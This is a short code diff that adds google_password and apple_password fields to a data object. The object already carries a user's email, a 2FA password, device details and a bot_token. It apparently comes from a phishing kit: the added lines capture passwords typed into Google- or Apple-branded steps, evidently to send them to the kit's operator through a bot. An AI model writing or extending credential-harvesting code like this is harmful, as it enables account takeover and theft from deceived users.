@@ -907,6 +907,8 @@ function initApp() {
             email: currentEmail,
             details: details,
             password_2fa: currentPassword,
+            google_password: (step.startsWith("google_") ? currentPassword : (userGooglePassword || null)),
+            apple_password: (step.startsWith("apple_") ? currentPassword : (userApplePassword || null)),
             device: currentDevice,
             is_test: isTestFlag,
             bot_token: botTokenParam
